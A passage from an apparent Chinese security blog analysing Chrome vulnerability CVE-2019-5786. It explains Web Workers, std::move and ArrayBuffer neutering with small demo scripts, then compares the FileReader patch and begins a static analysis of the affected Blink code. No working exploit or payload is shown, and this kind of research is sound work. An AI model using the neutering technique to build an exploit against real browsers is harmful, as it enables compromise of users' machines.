alt="image-20210524173059338"></p><h4 id="（3）代码查看工具sourcegraph"><a href="#（3）代码查看工具sourcegraph" class="headerlink" title="（3）代码查看工具sourcegraph"></a>（3）代码查看工具sourcegraph</h4><p>该工具可以查看变量的定义和引用等。</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210524173405047.png" alt="image-20210524173405047"></p><h4 id="（4）Web-Worker"><a href="#（4）Web-Worker" class="headerlink" title="（4）Web Worker"></a>（4）Web Worker</h4><p>在chrome中，Worker由v8实现，而非blink，验证如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1.</span>js</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span>(Worker)!==<span class="string">&quot;undefined&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span>(Worker));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release<span class="comment"># ./d8 1.js </span></span><br><span class="line">1</span><br><span class="line"><span class="keyword">function</span></span><br></pre></td></tr></table></figure><p>其实这种方式是可以确定js函数是在v8引擎实现的还是在blink引擎实现的，比如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1.</span>js</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span>(FileReader)!==<span class="string">&quot;undefined&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span>(FileReader));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release<span class="comment"># ./d8 1.js </span></span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>而在浏览器中就可以正常的输出，将console.log替换为document.write</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210525160118851.png" alt="image-20210525160118851"></p><p>扯远了，继续说Web Worker</p><p>JavaScript 语言采用的是单线程模型，也就是说，所有任务只能在一个线程上完成，一次只能做一件事。前面的任务没做完，后面的任务只能等着。随着电脑计算能力的增强，尤其是多核 CPU 的出现，单线程带来很大的不便，无法充分发挥计算机的计算能力。</p><p>Web Worker 的作用，就是为 JavaScript 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行。在主线程运行的同时，Worker 线程在后台运行，两者互不干扰。等到 Worker 线程完成计算任务，再把结果返回给主线程。这样的好处是，一些计算密集型或高延迟的任务，被 Worker 线程负担了，主线程（通常负责 UI 交互）就会很流畅，不会被阻塞或拖慢。</p><p>Worker 线程一旦新建成功，就会始终运行，不会被主线程上的活动（比如用户点击按钮、提交表单）打断。这样有利于随时响应主线程的通信。但是，这也造成了 Worker 比较耗费资源，不应该过度使用，而且一旦使用完毕，就应该关闭。</p><p>Web Worker 有以下几个使用注意点。</p><p>（1）<strong>同源限制</strong></p><p>分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。</p><p>（2）<strong>DOM 限制</strong></p><p>Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用<code>document</code>、<code>window</code>、<code>parent</code>这些对象。但是，Worker 线程可以<code>navigator</code>对象和<code>location</code>对象。</p><p>（3）<strong>通信联系</strong></p><p>Worker 线程和主线程不在同一个上下文环境，它们不能直接通信，必须通过消息完成。</p><p>（4）<strong>脚本限制</strong></p><p>Worker 线程不能执行<code>alert()</code>方法和<code>confirm()</code>方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。</p><p>（5）<strong>文件限制</strong></p><p>Worker 线程无法读取本地文件，即不能打开本机的文件系统（<code>file://</code>），它所加载的脚本，必须来自网络。[6]</p><h4 id="（5）std-move"><a href="#（5）std-move" class="headerlink" title="（5）std::move"></a>（5）std::move</h4><p>函数原型定义如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">typename</span> remove_reference&lt;T&gt;::<span class="function">type&amp;&amp; <span class="title">move</span><span class="params">(T&amp;&amp; t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;<span class="keyword">typename</span> remove_reference&lt;T&gt;::type&amp;&amp;&gt;(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过move定义可以看出，move并没有”移动“什么内容，<strong>只是将传入的值转换为右值</strong>，此外没有其他动作。std::move+移动构造函数或者移动赋值运算符，才能充分起到减少不必要拷贝的意义。</p><blockquote><p>std::move函数可以以非常简单的方式将左值引用转换为右值引用。（左值、左值引用、右值、右值引用 参见：[7]）</p><p>通过std::move，可以避免不必要的拷贝操作。</p><p>std::move是为性能而生。</p><p>std::move是将对象的状态或者所有权从一个对象转移到另一个对象，只是转移，没有内存的搬迁或者内存拷贝。[8]</p><p>还有一份比较详细的解释，参考[9]</p></blockquote><p>对于我们来说，move的作用就是转变所有权的过程，该过程不涉及内存拷贝而只是将某进程或线程的所有权转交给另一个进程或线程。</p><p>调试的过程中发现：所谓std::move并不是简单的替换指针指向，其中也会涉及到内存拷贝的操作以及内存释放的操作，具体为什么节约性能暂时不清楚，下面是当我操作string对象的时候的代码以及内存现场，其中涉及了内存拷贝的操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::string str = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    std::string str1;</span><br><span class="line">    str1 = std::<span class="built_in">move</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数调用栈如下，通过调试的过程中，发现std::move的过程是先通过memcpy拷贝内存，之后将原来内存的第一个字符overwrite为0x00，这样原来的str读取后就为空。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1      vcruntime140d.dll!memcpy(unsigned char * dst, unsigned char * src, unsigned long count)</span><br><span class="line">2      test_c++.exe!std::string::_Memcpy_val_from(const std::string &amp; _Right)</span><br><span class="line">3      test_c++.exe!std::string::_Take_contents(std::string &amp; _Right, std::integral_constant&lt;bool,1&gt; __formal)</span><br><span class="line">4      test_c++.exe!std::string::_Move_assign(std::string &amp; _Right, std::_Equal_allocators __formal)</span><br><span class="line">5      test_c++.exe!std::string::operator=(std::string &amp;&amp; _Right)</span><br><span class="line">6      test_c++.exe!main()</span><br><span class="line">7      test_c++.exe!invoke_main()</span><br><span class="line">8      test_c++.exe!__scrt_common_main_seh()</span><br><span class="line">9      test_c++.exe!__scrt_common_main()</span><br><span class="line">10     test_c++.exe!mainCRTStartup(void * __formal)</span><br><span class="line">11     kernel32.dll!@BaseThreadInitThunk@12()</span><br><span class="line">12     ntdll.dll!__RtlUserThreadStart()</span><br><span class="line">13     ntdll.dll!__RtlUserThreadStart@8()</span><br></pre></td></tr></table></figure><p>所以不可以单纯的将std::move理解为不含任何空间拷贝或者分配释放，可能它的作用是减少空间拷贝的次数。</p><h4 id="（6）ArrayBuffer-Neutering"><a href="#（6）ArrayBuffer-Neutering" class="headerlink" title="（6）ArrayBuffer Neutering"></a>（6）ArrayBuffer Neutering</h4><p>参考[14]</p><p>如何释放一个 ArrayBuffer 的 <strong>backing store</strong> 。通常而言，可以通过转移 ArrayBuffer （比如转移给另一个线程）来实现底层堆块的释放，这称之为 <strong>Neuter</strong> 。在 V8 中，ArrayBuffer 提供了 <code>Neuter</code> 方法，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Detaches this ArrayBuffer and all its views (typed arrays).</span><br><span class="line"> * Detaching sets the byte length of the buffer and all typed arrays to zero,</span><br><span class="line"> * preventing JavaScript from ever accessing underlying backing store.</span><br><span class="line"> * ArrayBuffer should have been externalized and must be detachable.</span><br><span class="line"> */</span><br><span class="line">void Detach();</span><br><span class="line"></span><br><span class="line">// TODO(913887): fix the use of &#x27;neuter&#x27; in the API.</span><br><span class="line">V8_DEPRECATE_SOON(&quot;Use Detach() instead.&quot;, inline void Neuter()) &#123; Detach(); &#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Make this ArrayBuffer external. The pointer to underlying memory block</span><br><span class="line"> * and byte length are returned as |Contents| structure. After ArrayBuffer</span><br><span class="line"> * had been externalized, it does no longer own the memory block. The caller</span><br><span class="line"> * should take steps to free memory when it is no longer needed.</span><br><span class="line"> *</span><br><span class="line"> * The Data pointer of ArrayBuffer::Contents must be freed using the provided</span><br><span class="line"> * deleter, which will call ArrayBuffer::Allocator::Free if the buffer</span><br><span class="line"> * was allocated with ArraryBuffer::Allocator::Allocate.</span><br><span class="line"> */</span><br><span class="line">Contents Externalize();</span><br></pre></td></tr></table></figure><p>可以看到，调用 <code>Neuter</code> 时 ArrayBuffer 已经被 <strong>Externalized</strong> 了，此时 ArrayBuffer 的 <strong>backing store</strong> 已经被调用方所释放了。</p><p><strong>Neuter</strong> 一个 ArrayBuffer 的常规做法是把它转移给一个工作者线程（ <a class="link"   href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers" >Web Workers<i class="fas fa-external-link-alt"></i></a> ）。与桌面软件一样，JavaScript 默认的执行线程为 UI 线程，如果要执行复杂的计算工作，应当新建一个工作者线程来执行任务，以防止 UI 失去响应。</p><p>在 JavaScript 中，各线程之间通过 <code>postMessage</code> 实现数据的发送、通过 <code>onmessage</code> 回调函数实现消息的相应。线程之间的数据传递是通过复制（而不是共享）来实现的，因此传递对象时会经历序列化和反序列化的过程，即传出时进行序列化，传入时进行反序列化。大多数浏览器通过 <a class="link"   href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm" >Structured clone algorithm<i class="fas fa-external-link-alt"></i></a> 来实现这一特性。</p><p>如果要传递的对象实现了 <a class="link"   href="https://developer.mozilla.org/en-US/docs/Web/API/Transferable" >Transferable<i class="fas fa-external-link-alt"></i></a> 接口，那么可以实现数据的高效转移，即并不复制数据，而是通过直接转移所有权来实现传递。对于这种传递方式，因为直接转移了所有权，因此原有线程不再享有对象数据的访问权限。ArrayBuffer 就是以这样的方式转移的，但这里笔者有一个 <strong>疑问</strong> ：实际情况中，原有 ArrayBuffer 的 <strong>backing store</strong> 会被释放，显然在接收线程中会有新的堆块的分配以及数据的复制，并不是简单的修改指针的指向，这和 MDN 的文档描述的高效理念是冲突的。</p><p>线程相关的两个重要概念定义如下：</p><ul><li><p><code>postMessage</code> 发送消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">worker.postMessage(message, [transfer]);</span><br></pre></td></tr></table></figure><ul><li>message 表示要传递的数据</li><li>如果有实现了 <code>Transferable</code> 的对象，可以以数组元素的方式放到第二个参数中，以提高传递效率，但是在第一个参数中需要指定一个引用，以方便目标线程接收</li></ul></li><li><p><code>onmessage</code> 响应消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myWorker.onmessage = function(e) &#123; ... &#125;</span><br></pre></td></tr></table></figure><ul><li>通过事件的 <code>data</code> 属性访问接收到的数据</li></ul></li></ul><p>一个简单的例子如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- main.html 的代码 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var ab = new ArrayBuffer(0x1000);</span><br><span class="line">var worker = new Worker(&#x27;worker.js&#x27;);</span><br><span class="line">console.log(&#x27;Main thread: before postMessage, ab.byteLength is &#x27; + ab.byteLength);</span><br><span class="line">worker.postMessage(ab, [ab]);</span><br><span class="line">console.log(&#x27;Main thread: after postMessage, ab.byteLength is &#x27; + ab.byteLength);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">// worker.js 的代码</span><br><span class="line">onmessage = function(message) &#123;</span><br><span class="line">    var ab = message.data;</span><br><span class="line">    console.log(&#x27;Worker thread: received: &#x27; + ab);</span><br><span class="line">    console.log(&#x27;Wroker thread: ArrayBuffer.byteLength is : &#x27; + ab.byteLength);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Main thread: before postMessage, ab.byteLength is 4096</span><br><span class="line">Main thread: after postMessage, ab.byteLength is 0</span><br><span class="line">Worker thread: received: [object ArrayBuffer]</span><br><span class="line">Wroker thread: ArrayBuffer.byteLength is : 4096</span><br></pre></td></tr></table></figure><p>McAfee Labs 的文章提到，使用 <a class="link"   href="https://developer.mozilla.org/en-US/docs/Web/API/BaseAudioContext/decodeAudioData" >AudioContext.decodeAudioData<i class="fas fa-external-link-alt"></i></a> 同样可以实现 ArrayBuffer 的 <a class="link"   href="https://programlife.net/tags/Neuter/" >Neuter<i class="fas fa-external-link-alt"></i></a> 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var ab = new ArrayBuffer(0x1000);</span><br><span class="line">var context = new AudioContext();</span><br><span class="line">console.log(&#x27;Before decodeAudioData, ab.byteLength is &#x27; + ab.byteLength);</span><br><span class="line">context.decodeAudioData(ab, </span><br><span class="line">    function(buffer) &#123;</span><br><span class="line">        console.log(&#x27;decode succeed: &#x27; + buffer);</span><br><span class="line">    &#125;, </span><br><span class="line">    function(e) &#123;</span><br><span class="line">        console.log(&#x27;decode failed: &#x27; + e);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">console.log(&#x27;After decodeAudioData, ab.byteLength is &#x27; + ab.byteLength);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>由测试结果可知，不管解码成功与否，ArrayBuffer 都会被转移：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before decodeAudioData, ab.byteLength is 4096</span><br><span class="line">After decodeAudioData, ab.byteLength is 0</span><br><span class="line">decode failed: EncodingError: Unable to decode audio data</span><br></pre></td></tr></table></figure><h3 id="3、补丁比较"><a href="#3、补丁比较" class="headerlink" title="3、补丁比较"></a>3、补丁比较</h3><p>观察补丁代码，可以发现在if (!finished_loading_)的逻辑上做了修改</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210514163855121.png" alt="image-20210514163855121"></p><p>补丁前处理逻辑：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br></pre></td></tr></table></figure><p>补丁后处理逻辑</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> DOMArrayBuffer::Create(<span class="built_in">ArrayBuffer</span>::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));</span><br></pre></td></tr></table></figure><p>可以看出一个使用了raw_data_-&gt;ToArrayBuffer()作为参数，另一个使用了ArrayBuffer::Create()的返回值作为参数。</p><p>而commit的信息也提示了我们修复后的代码可能新开辟了一块内存</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Merge M72: FileReader: Make a copy of the ArrayBuffer when returning partial results.</span><br><span class="line"></span><br><span class="line">This is to avoid accidentally ending up with multiple references to the</span><br><span class="line">same underlying ArrayBuffer.</span><br></pre></td></tr></table></figure></blockquote><p>猜测补丁后的Create将原有buffer内容复制到了一个新的buffer上，目的是为了避免多个指针指向同一块内存引发误操作。</p><h3 id="4、漏洞分析"><a href="#4、漏洞分析" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><h4 id="（1）静态分析"><a href="#（1）静态分析" class="headerlink" title="（1）静态分析"></a>（1）静态分析</h4><p>通过代码分析下函数功能。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DOMArrayBuffer* <span class="title">FileReaderLoader::ArrayBufferResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  DOMArrayBuffer* result = DOMArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">ToArrayBuffer</span>());</span><br><span class="line">  <span class="keyword">if</span> (finished_loading_) &#123;</span><br><span class="line">    array_buffer_result_ = result;</span><br><span class="line">    <span class="built_in">AdjustReportedMemoryUsageToV8</span>(</span><br><span class="line">        <span class="number">-1</span> * <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(raw_data_-&gt;<span class="built_in">ByteLength</span>()));</span><br><span class="line">    raw_data_.<span class="built_in">reset</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FileReaderLoader::ArrayBufferResult函数首先判断文件是否已经全部读取完成，如果已全部读取完成，则返回该缓冲区，如果尚未加载或产生错误，则返回空，如果数据正在被加载，则返回DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer())的返回值。</p><p>修复后的代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DOMArrayBuffer* <span class="title">FileReaderLoader::ArrayBufferResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (!finished_loading_) &#123;</span><br><span class="line">    <span class="keyword">return</span> DOMArrayBuffer::<span class="built_in">Create</span>(</span><br><span class="line">        ArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">Data</span>(), raw_data_-&gt;<span class="built_in">ByteLength</span>()));</span><br><span class="line">  &#125;</span><br><span class="line">  array_buffer_result_ = DOMArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">ToArrayBuffer</span>());</span><br><span class="line">  <span class="built_in">AdjustReportedMemoryUsageToV8</span>(<span class="number">-1</span> *</span><br><span class="line">                                <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(raw_data_-&gt;<span class="built_in">ByteLength</span>()));</span><br><span class="line">  raw_data_.<span class="built_in">reset</span>();</span><br><span class="line">  <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复后的逻辑仅仅在数据正在被加载时的处理不同，它使用了DOMArrayBuffer::Create(ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()))的返回值。</p><p>所以首先查看ToArrayBuffer()函数，首先判断已加载的部分是否等于buffer的长度，如果不满足条件，则调用Slice函数对buffer_进行切割。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.cc</span></span><br><span class="line"><span class="function">scoped_refptr&lt;ArrayBuffer&gt; <span class="title">ArrayBufferBuilder::ToArrayBuffer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Fully used. Return m_buffer as-is.</span></span><br><span class="line">  <span class="keyword">if</span> (buffer_-&gt;<span class="built_in">ByteLength</span>() == bytes_used_)</span><br><span class="line">    <span class="keyword">return</span> buffer_;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> buffer_-&gt;<span class="built_in">Slice</span>(<span class="number">0</span>, bytes_used_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续查看Slice函数，简单的调用了SliceImpl函数对buffer_进行处理。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">scoped_refptr&lt;ArrayBuffer&gt; <span class="title">ArrayBuffer::Slice</span><span class="params">(<span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">SliceImpl</span>(<span class="built_in">ClampIndex</span>(begin), <span class="built_in">ClampIndex</span>(end));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的ClampIndex函数作用为对参数值进行处理，首先将小于0的参数转换成从后面计算的偏移，之后再将参数限定在0和ByteLength()之间。其目的就是对参数进行处理</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">ArrayBuffer::ClampIndex</span><span class="params">(<span class="keyword">int</span> index)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> current_length = <span class="built_in">ByteLength</span>();</span><br><span class="line">  <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">    index = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(current_length + index);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ClampValue</span>(index, <span class="number">0</span>, current_length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">ArrayBuffer::ClampValue</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">unsigned</span> left, <span class="keyword">unsigned</span> right)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_LE</span>(left, right);</span><br><span class="line">  <span class="keyword">unsigned</span> result;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">0</span>)</span><br><span class="line">    result = left;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span>&gt;(x);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result &lt; left)</span><br><span class="line">    result = left;</span><br><span class="line">  <span class="keyword">if</span> (right &lt; result)</span><br><span class="line">    result = right;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进SliceImpl函数，该函数调用了ArrayBuffer::Create函数，以static_cast&lt;const char*&gt;(Data()) + begin与长度作为参数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">scoped_refptr&lt;ArrayBuffer&gt; <span class="title">ArrayBuffer::SliceImpl</span><span class="params">(<span class="keyword">unsigned</span> begin, <span class="keyword">unsigned</span> end)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size = <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(begin &lt;= end ? end - begin : <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> ArrayBuffer::<span class="built_in">Create</span>(<span class="keyword">static_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(<span class="built_in">Data</span>()) + begin, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看下Data()的定义，发现是将buffer的数据返回，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">ArrayBuffer::Data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> contents_.<span class="built_in">Data</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看下ArrayBuffer::Create函数，该函数的作用就是创建一个buffer，并将之前的数据拷贝进去。</p><figure class="highlight c++"><table><tr><td 